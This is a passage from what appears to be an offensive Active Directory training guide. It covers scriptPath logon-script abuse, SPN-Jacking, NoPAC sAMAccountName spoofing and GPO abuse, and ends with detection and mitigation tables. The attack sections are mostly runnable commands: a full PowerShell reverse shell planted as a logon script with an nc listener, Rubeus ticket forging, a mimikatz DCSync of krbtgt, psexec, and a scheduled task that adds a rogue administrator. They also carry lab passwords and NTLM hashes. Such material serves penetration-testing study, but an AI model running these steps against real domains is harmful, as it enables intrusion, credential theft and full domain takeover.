./adalanche-linux-x64-v2024.1.11-43-g7774681 collect activedirectory --domain [domain] --server [target-ip] --username 'david' --password 'SecurePassDav!d5'

# Launch analysis interface
./adalanche-linux-x64-v2024.1.11-44-gf1573f2 analyze --datapath data

In Adalanche, query (objectClass=user), right-click the david node, and select What can this node pwn?. The edge WriteScriptPath indicates write rights over scriptPath.

8.2.2 Enumeration from Windows

Import-Module .\PowerView.ps1
$DavidSID = (Get-DomainUser -Identity david).objectSID
Get-DomainObjectAcl -Identity eric -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $DavidSID}
# Look for ReadProperty, WriteProperty on ObjectAceType: Script-Path

Adalanche on Windows: run without parameters for full auto-mode (autodetects domain, collects, and launches UI).

8.2.3 Abusing Write scriptPath from Linux

Attack path: enumerate NETLOGON write permissions → place payload → update scriptPath → wait for victim logon.

# Step 1: List NETLOGON contents
smbclient //[target-ip]/NETLOGON -U david%'SecurePassDav!d5' -c "ls"

# Check permissions on EricsScripts folder
smbcacls //[target-ip]/NETLOGON /EricsScripts -U David%'SecurePassDav!d5'
# Look for: ACL:[DOMAIN]\[user]:ALLOWED/OI|CI/RWX
# Step 2: Base64-encode PowerShell reverse shell for .bat file
python3 -c 'import base64; print(base64.b64encode((r"""$LHOST = "[target-ip]"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()""").encode("utf-16-le")).decode())'
# logonScript.bat content:
# powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABMAEgATwBT...

# Alternative: logonScript.vbs content:
# CreateObject("Wscript.shell").Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABMAEgATwBT..."

# Step 2 cont: Upload payload to NETLOGON
smbclient //[target-ip]/NETLOGON --directory EricsScripts -U David%'SecurePassDav!d5' -c "put logonScript.bat"

# Start listener before Step 3
nc -nvlp 9001
# Step 3a: Modify scriptPath via ldapmodify
# Create LDIF file:
# dn: CN=eric,CN=Users,DC=[domain],DC=[tld]
# changetype: modify
# replace: scriptPath
# scriptPath: EricsScripts\logonScript.bat

ldapmodify -H ldap://[target-ip] -x -D '[email protected]' -w 'SecurePassDav!d5' -f logonScript.ldif

# Verify update
ldapsearch -LLL -H ldap://[target-ip] -x -D '[email protected]' -w 'SecurePassDav!d5' -b "DC=[domain],DC=[tld]" "(sAMAccountName=Eric)" scriptPath
# Step 3b: Alternatively use bloodyAD
pip install bloodyAD

bloodyAD --host "[target-ip]" -d "[domain]" -u "david" -p '[password]' set object eric scriptPath -v 'EricsScripts\logonScript.bat'

# Verify
bloodyAD --host "[target-ip]" -d "[domain]" -u "david" -p '[password]' get object eric --attr scriptPath
# Step 4: Wait for eric to log on - reverse shell arrives on nc listener
# nc -nvlp 9001
# connect to [[target-ip]] from (UNKNOWN) [[target-ip]] 49732
# whoami
# [domain]\[user]

8.2.4 Abusing Write scriptPath from Windows

# Step 1: List NETLOGON via LOGONSERVER variable
ls $env:LOGONSERVER\NETLOGON

# Check permissions with icacls
icacls $env:LOGONSERVER\NETLOGON\EricsScripts
# Look for: [DOMAIN]\[user]:(OI)(CI)(RX,W)

# Automated discovery with ScriptSentry
.\Invoke-ScriptSentry.ps1
# Finds: UnsafeLogonScriptPermission, PlaintextCredentials, etc.

# Step 3: Modify scriptPath with PowerView
Import-Module .\PowerView.ps1
Set-DomainObject eric -Set @{'scriptPath'='EricsScripts\logonScript.bat'}

# Verify
Get-DomainObject eric -Properties scriptPath

8.2.5 Methodology

  • Find scriptPath write rights on target user: 
    (.dacledit) python3 examples/dacledit.py -principal 'david' -target 'eric' -dc-ip [target-ip] [domain]/'david':'SecurePassDav!d5'
  • Enumerate NETLOGON write permissions: 
    smbclient //[target-ip]/NETLOGON -U david%'SecurePassDav!d5' -c "ls"
smbcacls //[target-ip]/NETLOGON /EricsScripts -U David%'SecurePassDav!d5'
  • Create and upload PowerShell reverse shell payload (.bat or .vbs): 
    smbclient //[target-ip]/NETLOGON --directory EricsScripts -U David%'SecurePassDav!d5' -c "put logonScript.bat"
  • Start listener: 
    nc -nvlp 9001
  • Set target's scriptPath attribute to payload path: 
    bloodyAD --host "[target-ip]" -d "[domain]" -u "david" -p '[password]' set object eric scriptPath -v 'EricsScripts\logonScript.bat'
  • (Windows alternative) Set scriptPath via PowerView: 
    Set-DomainObject eric -Set @{'scriptPath'='EricsScripts\logonScript.bat'}

8.3 SPN Jacking

SPN Jacking abuses WriteSPN rights to manipulate Service Principal Names, exploiting Constrained Delegation to compromise targets when password cracking is not feasible. It requires a machine account with Constrained Delegation configured and the ability to modify SPNs on another account.

VariantDescription
Ghost SPN-JackingTargets SPNs associated with deleted/renamed accounts (orphaned SPNs) in Constrained Delegation lists
Live SPN-JackingRemoves a live SPN from its current account and adds it to a target, rerouting delegation

Scenario: gabriel (password Godisgood001) is a local admin on [host] and has WriteSPN over WEB01. [host] has Constrained Delegation for SPNs on DBSRV003, EXCH03, and DATABASE01.

8.3.1 Ghost SPN-Jacking from Windows

# Connect to target
xfreerdp /u:gabriel /p:[password] /d:[domain] /v:[target-ip] /dynamic-resolution /drive:.,linux

# Find WriteSPN rights (BloodHound cypher)
MATCH p=(n:User)-[r1:WriteSPN*1..]->(c:Computer) RETURN p

# Enumerate WriteSPN via PowerView
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $(ConvertTo-SID gabriel)}
# Look for: ActiveDirectoryRights: WriteProperty, ObjectAceType: Validated-SPN

# Check constrained delegation on [host]
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto

# Use Get-ConstrainedDelegation wrapper to find and check orphaned SPNs
Import-Module C:\Tools\PowerView.ps1
Import-Module C:\Tools\Get-ConstrainedDelegation.ps1
Get-ConstrainedDelegation
Get-ConstrainedDelegation -CheckOrphaned

# Assign orphaned SPN to target WEB01
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='dhcp/DATABASE01'} -Verbose

# Run S4U attack using [host]'s hash to impersonate Administrator on WEB01
.\Rubeus.exe s4u /domain:[domain] /user:[host]$ /rc4:ef3d150ee77eb9000001236c52bd2793 /impersonateuser:administrator /msdsspn:"dhcp/DATABASE01" /nowrap

# Substitute service name to CIFS/WEB01 to enable file access
.\Rubeus.exe tgssub /ticket:<TICKET_BASE64> /altservice:cifs/WEB01 /nowrap

# Import ticket and access WEB01
.\Rubeus.exe ptt /ticket:<MODIFIED_TICKET_BASE64>
ls \\web01\c$

8.3.2 Live SPN-Jacking from Windows

# Attempt to assign live SPN (will fail with constraint violation)
Set-DomainObject -Identity WEB01$ -Set @{serviceprincipalname='dmserver/DBSRV003'} -Verbose
# WARNING: A constraint violation occurred

# Record current SPNs on DBSRV003 before clearing
Get-DomainComputer DBSRV003 -Properties 'serviceprincipalname' | Select-Object -ExcludeProperty serviceprincipalname

# Clear SPNs from DBSRV003 (we have WriteSPN over it)
Set-DomainObject -Identity DBSRV003 -Clear 'serviceprincipalname' -Verbose

# Assign SPN to WEB01
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='dmserver/DBSRV003'} -Verbose

# Run S4U attack
.\Rubeus.exe s4u /domain:[domain] /user:[host]$ /rc4:ef3d150ee77eb9000001236c52bd2793 /impersonateuser:administrator /msdsspn:"dmserver/DBSRV003" /nowrap

# Substitute to HTTP/WEB01 for PowerShell Remoting
.\Rubeus.exe tgssub /ticket:<TICKET_BASE64> /altservice:HTTP/WEB01 /nowrap

# Import ticket
.\Rubeus.exe ptt /ticket:<MODIFIED_TICKET_BASE64>

# Restore DBSRV003 SPNs
Set-DomainObject -Identity DBSRV003 -Set @{serviceprincipalname='WSMAN/DBSRV003','WSMAN/DBSRV003.[domain]','TERMSRV/DBSRV003','TERMSRV/DBSRV003.[domain]','RestrictedKrbHost/DBSRV003','HOST/DBSRV003','RestrictedKrbHost/DBSRV003.[domain]','HOST/DBSRV003.[domain]'} -Verbose

# Access WEB01 via PS Remoting
Enter-PSSession -ComputerName WEB01

8.3.3 Live SPN-Jacking from Linux

# Set up Chisel proxy ([host] has no direct outbound route)
# On Linux attacker:
./chisel server --reverse
# On [host] (Windows):
.\chisel.exe client [target-ip]:8080 R:socks

# Configure proxychains
# /etc/proxychains.conf: socks5 127.0.0.1 1080

# Identify constrained delegation with findDelegation.py
proxychains4 -q findDelegation.py -target-domain [domain] -dc-ip [target-ip] -dc-host dc02 [domain]/[user]:[password]

# Clone Krbrelayx for addspn.py
git clone -b tgssub https://github.com/ShutdownRepo/impacket/ tgssub

# Save current SPNs, then clear DBSRV003 SPNs
proxychains4 -q python3 addspn.py [target-ip] -u '[domain]\gabriel' -p [password] --clear -t 'DBSRV003$' -dc-ip [target-ip]
# Save output to DBSRV003spns.txt

# Add the cleared SPN to WEB01
proxychains4 -q python3 addspn.py [target-ip] -u '[domain]\gabriel' -p [password] --spn 'dmserver/DBSRV003' -t 'WEB01$' -dc-ip [target-ip]

# Request S4U service ticket impersonating Administrator
proxychains4 -q getST.py -spn 'dmserver/DBSRV003' -impersonate Administrator '[domain]/[host]$' -hashes :ef3d150ee77eb9000001236c52bd2793 -dc-ip [target-ip]

# Inspect ticket service name
describeTicket.py Administrator@[email protected]

# Substitute service to cifs/WEB01
proxychains4 -q python3 tgssub/examples/tgssub.py -in Administrator@[email protected] -altservice "cifs/WEB01" -out newticket.ccache

# Verify modification
describeTicket.py newticket.ccache

# Use ticket to access WEB01
KRB5CCNAME=newticket.ccache proxychains4 -q smbexec.py -k -no-pass WEB01
# Alternative: latest getST.py handles tgssub in one command
proxychains4 -q getST.py -spn 'dmserver/DBSRV003' -impersonate Administrator '[domain]/[host]$' -hashes :ef3d150ee77eb9000001236c52bd2793 -dc-ip [target-ip] -altservice "cifs/WEB01.[domain]"

# Restore DBSRV003 SPNs
for spn in $(cat DBSRV003spns.txt); do proxychains4 -q python3 addspn.py [target-ip] -u '[domain]\gabriel' -p [password] -t 'DBSRV003$' --spn $spn; done

8.3.4 Methodology

  • Enumerate WriteSPN rights: 
    Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $(ConvertTo-SID gabriel)}
  • Find constrained delegation and orphaned SPNs: 
    Get-ConstrainedDelegation -CheckOrphaned
  • (Ghost) Assign orphaned SPN to target: 
    Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='dhcp/DATABASE01'} -Verbose
  • (Live) Clear SPN from source, assign to target: 
    Set-DomainObject -Identity DBSRV003 -Clear 'serviceprincipalname' -Verbose
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='dmserver/DBSRV003'} -Verbose
  • S4U attack with Rubeus (Windows): 
    .\Rubeus.exe s4u /domain:[domain] /user:[host]$ /rc4:ef3d150ee77eb9000001236c52bd2793 /impersonateuser:administrator /msdsspn:"dhcp/DATABASE01" /nowrap
  • Substitute service name and import ticket: 
    .\Rubeus.exe tgssub /ticket:<B64> /altservice:cifs/WEB01 /nowrap
.\Rubeus.exe ptt /ticket:<MODIFIED_B64>
  • (Linux) S4U + substitute with getST.py: 
    proxychains4 -q getST.py -spn 'dmserver/DBSRV003' -impersonate Administrator '[domain]/[host]$' -hashes :ef3d150ee77eb9000001236c52bd2793 -dc-ip [target-ip] -altservice "cifs/WEB01.[domain]"
  • Restore cleared SPNs after attack: 
    for spn in $(cat DBSRV003spns.txt); do proxychains4 -q python3 addspn.py [target-ip] -u '[domain]\gabriel' -p [password] -t 'DBSRV003$' --spn $spn; done

8.4 sAMAccountName Spoofing (NoPAC)

The NoPAC attack chains CVE-2021-42278 and CVE-2021-42287 to allow a domain user to escalate privileges by impersonating a Domain Controller.

CVEVulnerabilityRole in Attack
CVE-2021-42278No restriction on modifying sAMAccountName to omit trailing $Rename machine account to match DC name (without $)
CVE-2021-42287KDC appends $ and retries when account not found during Service Ticket requestRequest ST after reverting name; KDC matches the real DC account

Pre-requisites: Ability to create/control a machine account (or user account with GenericAll over another account), and either patches for CVE-2021-42278 and CVE-2021-42287 must be absent.

8.4.1 Enumeration from Windows

# Connect to target (alternate RDP port)
# xfreerdp /u:aneudy /p:[password] /d:[domain] /v:[target-ip]:13389 /dynamic-resolution /drive:.,linux

# Check NoPAC vulnerability (ticket size without PAC should be < 1000)
.\noPac.exe scan -domain [domain] -user aneudy -pass [password]

# Check MachineAccountQuota
(Get-DomainObject -SearchScope Base)."ms-ds-machineaccountquota"

# Find who created a specific machine account
Import-Module .\PowerView.ps1
$computerName = 'COMPUTERTEST1'
$computer = Get-DomainComputer -Identity $computerName -Properties 'ms-DS-CreatorSID'
$sid = (New-Object System.Security.Principal.SecurityIdentifier($computer.'ms-DS-CreatorSID', 0)).Value
ConvertFrom-SID $sid

# Count machines aneudy already created
$computers = Get-DomainComputer -Filter '(ms-DS-CreatorSID=*)' -Properties name,ms-ds-creatorsid
$aneudyComputers = $computers | where { (New-Object System.Security.Principal.SecurityIdentifier($_."ms-ds-creatorsid",0)).Value -eq (ConvertTo-SID aneudy) }
$aneudyComputers.Count

8.4.2 Abusing sAMAccountName Spoofing from Windows

# Step 1: Create computer account TEST01
Import-Module .\Powermad.ps1
$password = ConvertTo-SecureString 'Password123' -AsPlainText -Force
New-MachineAccount -MachineAccount "TEST01" -Password $($password) -Domain [domain] -DomainController [target-ip] -Verbose

# Step 2: Clear SPNs from TEST01
Import-Module .\PowerView.ps1
Set-DomainObject -Identity 'TEST01$' -Clear 'serviceprincipalname' -Domain [domain] -DomainController [target-ip] -Verbose

# Step 3: Rename TEST01 sAMAccountName to DC03 (no $)
Set-MachineAccountAttribute -MachineAccount "TEST01" -Value "dc03" -Attribute samaccountname -Domain [domain] -DomainController [target-ip] -Verbose

# Step 4: Request TGT as dc03 using TEST01 credentials
.\Rubeus.exe asktgt /user:dc03 /password:"Password123" /domain:[domain] /dc:[target-ip] /nowrap

# Step 5: Revert TEST01 sAMAccountName back to TEST01
Set-MachineAccountAttribute -MachineAccount "TEST01" -Value "TEST01" -Attribute samaccountname -Domain [domain] -DomainController [target-ip] -Verbose

# Step 6: Request S4U2self service ticket impersonating Administrator (LDAP for DCSync)
.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:"ldap/dc03.[domain]" /dc:[target-ip] /ptt /ticket:doIFJDCCBSCgAwIBBa...SNIP...

# Perform DCSync with the imported ticket
.\mimikatz.exe "lsadump::dcsync /domain:[domain] /kdc:dc03.[domain] /user:krbtgt" exit

8.4.3 Enumeration from Linux

# Scan with NoPac scanner
git clone -q https://github.com/Ridter/noPac
python3 noPac/scanner.py -dc-ip [target-ip] [domain]/[user]:[password] -use-ldap
# Shows: ms-DS-MachineAccountQuota, TGT sizes with/without PAC

8.4.4 Abusing sAMAccountName Spoofing from Linux

The Linux method uses a controlled user account (felipe) with GenericAll from aneudy, rather than a new machine account.

# Install bloodyAD
sudo apt-get install libkrb5-dev
git clone -q https://github.com/CravateRouge/bloodyAD
cd bloodyAD/
python3 -m venv .bloodyAD; source .bloodyAD/bin/activate
python3 -m pip install .

# Check felipe's current attributes
python3 bloodyAD.py -d [domain] -u aneudy -p [password] --host [target-ip] get object felipe | grep "servicePrincipalName\|sAMAccountName"

# Clear felipe's SPNs (note existing SPNs first)
python3 bloodyAD.py -d [domain] -u aneudy -p [password] --host [target-ip] set object felipe servicePrincipalName

# Rename felipe's sAMAccountName to DC03
python3 bloodyAD.py -d [domain] -u aneudy -p [password] --host [target-ip] set object felipe sAMAccountName -v DC03

# Request TGT as DC03 (using felipe's password)
getTGT.py [domain]/[user]:[password] -dc-ip [target-ip]
# Saves: dc03.ccache

# Revert felipe's sAMAccountName (use DN since sAMAccountName is now DC03)
python3 bloodyAD.py -d [domain] -u aneudy -p [password] --host [target-ip] set object "CN=felipe,CN=Users,DC=[domain],DC=[tld]" sAMAccountName -v felipe

# Request S4U2self ticket impersonating Administrator
KRB5CCNAME=dc03.ccache getST.py [domain]/[user] -self -impersonate 'Administrator' -altservice 'cifs/dc03.[domain]' -k -no-pass -dc-ip [target-ip]

# Get shell on DC
KRB5CCNAME=Administrator@[email protected] psexec.py dc03.[domain] -k -no-pass

8.4.5 Methodology

  • Scan for NoPAC vulnerability: 
    python3 noPac/scanner.py -dc-ip [target-ip] [domain]/[user]:[password] -use-ldap
  • (Windows) Create machine account and clear SPNs: 
    New-MachineAccount -MachineAccount "TEST01" -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force) -Domain [domain] -DomainController [target-ip] -Verbose
Set-DomainObject -Identity 'TEST01$' -Clear 'serviceprincipalname' -Domain [domain] -DomainController [target-ip] -Verbose
  • (Windows) Rename sAMAccountName to DC name, get TGT, revert: 
    Set-MachineAccountAttribute -MachineAccount "TEST01" -Value "dc03" -Attribute samaccountname -Domain [domain] -DomainController [target-ip] -Verbose
.\Rubeus.exe asktgt /user:dc03 /password:"Password123" /domain:[domain] /dc:[target-ip] /nowrap
Set-MachineAccountAttribute -MachineAccount "TEST01" -Value "TEST01" -Attribute samaccountname -Domain [domain] -DomainController [target-ip] -Verbose
  • (Windows) S4U2self for LDAP service ticket, then DCSync: 
    .\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:"ldap/dc03.[domain]" /dc:[target-ip] /ptt /ticket:<TGT_BASE64>
.\mimikatz.exe "lsadump::dcsync /domain:[domain] /kdc:dc03.[domain] /user:krbtgt" exit
  • (Linux) Clear SPN, rename target user's sAMAccountName to DC name: 
    python3 bloodyAD.py -d [domain] -u aneudy -p [password] --host [target-ip] set object felipe servicePrincipalName
python3 bloodyAD.py -d [domain] -u aneudy -p [password] --host [target-ip] set object felipe sAMAccountName -v DC03
  • (Linux) Get TGT, revert name, then S4U2self + psexec: 
    getTGT.py [domain]/[user]:[password] -dc-ip [target-ip]
python3 bloodyAD.py -d [domain] -u aneudy -p [password] --host [target-ip] set object "CN=felipe,CN=Users,DC=[domain],DC=[tld]" sAMAccountName -v felipe
KRB5CCNAME=dc03.ccache getST.py [domain]/[user] -self -impersonate 'Administrator' -altservice 'cifs/dc03.[domain]' -k -no-pass -dc-ip [target-ip]
KRB5CCNAME=Administrator@[email protected] psexec.py dc03.[domain] -k -no-pass

8.5 GPO Attacks

Group Policy Objects (GPOs) are collections of policy settings applied to users and computers via Organizational Units, Sites, or Domains. GPOs consist of a Group Policy Container (GPC) (LDAP object with GUID) and a Group Policy Template (GPT) (files in SYSVOL). Policies apply in order: Local → Site → Domain → OU; last applied wins unless a higher-level GPO is enforced.

RightAttack Surface
Modify GPOAlter existing GPO settings to execute commands on all computers in scope
Link GPOLink controlled/created GPOs to Sites, Domains, or OUs
Create GPOCreate new GPOs; combine with link rights for full compromise

8.5.1 GPO Properties Reference

PropertyDescription
displaynameHuman-readable GPO name shown in GPMC
nameInternal GUID identifying the GPO
gpcfilesyspathSYSVOL path to the GPT folder
objectguidGlobally unique identifier for the GPO
gplinkLDAP path indicating where GPO is linked; suffix ;0=enabled, ;1=disabled, ;2=enforced, ;3=enforced+disabled

8.5.2 GPO Enumeration from Windows

Import-Module .\PowerView.ps1

# List all GPOs
Get-DomainGPO | Select-Object -First 1
Get-DomainGPO -Properties displayname

# Find GPO links at domain level
Get-DomainObject -SearchScope Base -Properties gplink

# Find GPO links at site level
Get-DomainSite -Properties gplink
Get-DomainSite -Properties distinguishedname

# Find GPO links at OU level
Get-DomainOU | select name, gplink

# List computers in each OU
Get-DomainOU | foreach { $ou = $_.distinguishedname; Get-DomainComputer -SearchBase $ou -Properties dnshostname | select @{Name='OU';Expression={$ou}}, @{Name='FQDN';Expression={$_.dnshostname}} }

# Find non-admin users who can MODIFY GPOs (filter SIDs > 1000)
Get-DomainGPO | Select-Object -First 1 | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' }

# Convert SID to name
ConvertFrom-SID S-1-5-21-831407601-1803900599-2479021482-1604

# Get group members
Get-DomainGroupMember "Server Admins" | select MemberName

# Find non-admin users who can CREATE GPOs
$identity = (Get-DomainGPO).distinguishedname -replace 'CN=\{[A-F0-9-]+\},',''; Get-DomainObjectACL -Identity $identity -ResolveGUIDs | where { $_.ActiveDirectoryRights -contains "CreateChild" -and $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' } | foreach { ConvertFrom-SID $_.SecurityIdentifier }

# Find users who can LINK GPOs to sites
Get-DomainSite -Properties distinguishedname | foreach { Get-DomainObjectAcl -SearchBase $_.distinguishedname -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List }

# Find users who can LINK GPOs to domain
Get-DomainObjectAcl -SearchScope Base -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List

# Find users who can LINK GPOs to OUs
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List

# Automated GPO enumeration wrapper
Import-Module .\Get-GPOEnumeration.ps1
Get-GPOEnumeration
# Also supports: Get-GPOEnumeration -ModifyGPOs / -LinkGPOs / -CreateGPO

8.5.3 GPO Enumeration from Linux

# List GPOs with GPOwned
proxychains4 -q python3 GPOwned.py -u gabriel -p [password] -d [domain] -dc-ip [target-ip] -gpcmachine -listgpo

# List GPO links
proxychains4 -q python3 GPOwned.py -u gabriel -p [password] -d [domain] -dc-ip [target-ip] -gpcmachine -listgplink

# Get all GPO GUIDs for dacledit analysis
proxychains4 -q python3 GPOwned.py -u gabriel -p [password] -d [domain] -dc-ip [target-ip] -gpcmachine -listgpo | grep " Name:"

# Check DACL on a specific GPO (using its distinguished name)
proxychains4 -q python3 examples/dacledit.py [domain]/[user]:[password] -target-dn "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=[domain],DC=[tld]" -dc-ip [target-ip]

8.5.4 Abusing GPOs from Windows (SharpGPOAbuse)

# Check if GroupPolicy module is available
Get-Command -Module GroupPolicy

# Create a new GPO
New-GPO -Name TestGPO -Comment "This is a test GPO."

# Link GPO to an OU
New-GPLink -Name TestGPO -Target "OU=TestOU,DC=[domain],DC=[tld]"

# Add local admin via SharpGPOAbuse
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount gabriel --GPOName "Default Security Policy - WKS"
# Output: Creates GptTmpl.inf in SYSVOL, increments versionNumber

# Verify the created policy file
cat "\\[domain]\SysVol\[domain]\Policies\{EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

# After GPO refresh, verify access
dir \\web01\c$

SharpGPOAbuse options:

OptionDescription
--AddUserRightsAdd rights to a user
--AddLocalAdminAdd user to local Administrators group
--AddComputerScriptAdd computer startup script
--AddUserScriptConfigure user logon script
--AddComputerTaskConfigure computer immediate scheduled task
--AddUserTaskAdd immediate scheduled task for a user
Note: --AddLocalAdmin overwrites existing local Administrators if the policy has higher priority. Test in a controlled environment.

8.5.5 Abusing GPOs from Linux (pyGPOAbuse)

# Install pyGPOAbuse
git clone -q https://github.com/Hackndo/pyGPOAbuse
cd pyGPOAbuse; python3 -m pip install -r requirements.txt

# Backup the GPO before modifying
proxychains4 -q python3 GPOwned.py -u gabriel -p [password] -d [domain] -dc-ip [target-ip] -gpcmachine -backup backupgpo -name "{31B2F340-016D-11D2-945F-00C04FB984F9}"

# Abuse GPO: add user to Administrators via scheduled task
proxychains4 -q python3 pygpoabuse.py [domain]/[user]:[password] -gpo-id EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D -command "net user plaintext Password1234 /add && net localgroup Administrators plaintext /add" -taskname "PT_LocalAdmin" -description "this is a GPO test" -dc-ip [target-ip] -v

8.5.6 Methodology

  • Enumerate GPOs and modification rights (Windows): 
    Get-DomainGPO -Properties displayname
Get-DomainGPO | Select-Object -First 1 | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' }
  • Find who can link GPOs to Sites/Domain/OUs: 
    Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-List
  • (Linux) Enumerate GPOs and links: 
    proxychains4 -q python3 GPOwned.py -u gabriel -p [password] -d [domain] -dc-ip [target-ip] -gpcmachine -listgpo
proxychains4 -q python3 GPOwned.py -u gabriel -p [password] -d [domain] -dc-ip [target-ip] -gpcmachine -listgplink
  • Backup GPO before modifying (Linux): 
    proxychains4 -q python3 GPOwned.py -u gabriel -p [password] -d [domain] -dc-ip [target-ip] -gpcmachine -backup backupgpo -name "{GPO-GUID}"
  • (Windows) Abuse GPO to add local admin: 
    .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount gabriel --GPOName "Default Security Policy - WKS"
  • (Linux) Abuse GPO with pyGPOAbuse scheduled task: 
    proxychains4 -q python3 pygpoabuse.py [domain]/[user]:[password] -gpo-id EF1EBF2A-08F2-48E0-9D2E-67D9F2CE875D -command "net user plaintext Password1234 /add && net localgroup Administrators plaintext /add" -taskname "PT_LocalAdmin" -dc-ip [target-ip] -v
  • (Windows) Create and link a new GPO: 
    New-GPO -Name TestGPO -Comment "This is a test GPO."
New-GPLink -Name TestGPO -Target "OU=TestOU,DC=[domain],DC=[tld]"

8.6 Detection and Mitigation

8.6.1 Shadow Credentials

TypeDetails
DetectionMonitor Event ID 4768 for non-blank CertIssuerName in TGT requests (PKINIT use); monitor Event ID 5136 for unauthorized modifications to msDS-KeyCredentialLink
MitigationAudit inbound object control for privileged accounts; add ACE denying EVERYONE from modifying msDS-KeyCredentialLink on non-WHfB accounts
 
# Detect PKINIT TGT requests (Event ID 4768 with non-empty CertIssuerName)
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4768}
foreach ($event in $events) {
    $xml = [xml]$event.ToXml()
    function Get-XmlContent($xmlNode) {
        if ($xmlNode -and $xmlNode.'#text') { return $xmlNode.'#text'.Trim() }
        return $null
    }
    $certIssuerName = Get-XmlContent ($xml.Event.EventData.Data | Where-Object { $_.Name -eq 'CertIssuerName' })
    if ($certIssuerName) {
        $event | Format-List -Property TimeCreated, Id, Message
    }
}

8.6.2 Logon Scripts

TypeDetails
DetectionAudit access rights and modifications to scriptPath and NETLOGON files; monitor scripts for plaintext credentials
MitigationRestrict write access on NETLOGON; ensure Domain Users, Authenticated Users, and Everyone do not have write permissions on logon script directories

8.6.3 SPN Jacking

TypeDetails
DetectionMonitor Event ID 4742 (computer account changes) for ServicePrincipalName changes not matching DNS names; monitor Event ID 4769 for S4U2Proxy with non-blank Transited Services, or S4U2Self where account info and service info point to the same account
MitigationRegular AD audits for anomalous WriteSPN rights and ghost SPNs in Constrained Delegation; add privileged accounts to Protected Users group

8.6.4 GPO Attacks

Event IDMeaning
5137Directory object created (new GPO)
5136Directory object modified (GPO change)
5141Directory object deleted (GPO removed)
Note: GPO change events (5137, 5136, 5141) are not enabled by default. Enable via: Group Policy Management Console → Default Domain Controller Policy → Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → DS Access → Audit Directory Service Changes → Success.
TypeDetails
DetectionMonitor Event IDs 5137, 5136, 5141 for unauthorized GPO creation, modification, deletion
MitigationRegular GPO audits; strict RBAC for GPO edit permissions; change management process with approval workflows before GPO changes go live

8.6.5 sAMAccountName Spoofing

TypeDetails
DetectionMonitor Event ID 4781 for account name changes where computer accounts are renamed to omit the trailing $
MitigationPatch CVE-2021-42278 and CVE-2021-42287 on all Domain Controllers; ensure security updates are current

9. NTLM Relay Attacks

9.1 The NTLM Authentication Protocol

NT Lan Manager (NTLM / MS-NLMP) is a family of security protocols - LM, NTLMv1, and NTLMv2 - used to authenticate remote users over Windows-based networks. NTLM is an embedded protocol: it has no dedicated network stack layer and rides on top of SMB, HTTP(S), LDAP(S), and other application protocols.

NTLMv2 provides three operations: authentication, message signing (integrity), and message sealing (confidentiality). NTLM is a challenge-response protocol using nonces (pseudo-random numbers for one-time use) to defend against replay attacks.

9.1.1 Key Pre-Authentication Facts

  • The NTLM version (NTLMv1 or NTLMv2) is configured out-of-band before authentication begins.
  • Client and server share the user's password hash as a secret key - it is never sent over the wire.
  • Neither plaintext credentials nor the hash is transmitted during the exchange.

9.1.2 SSPI and NTLM SSP

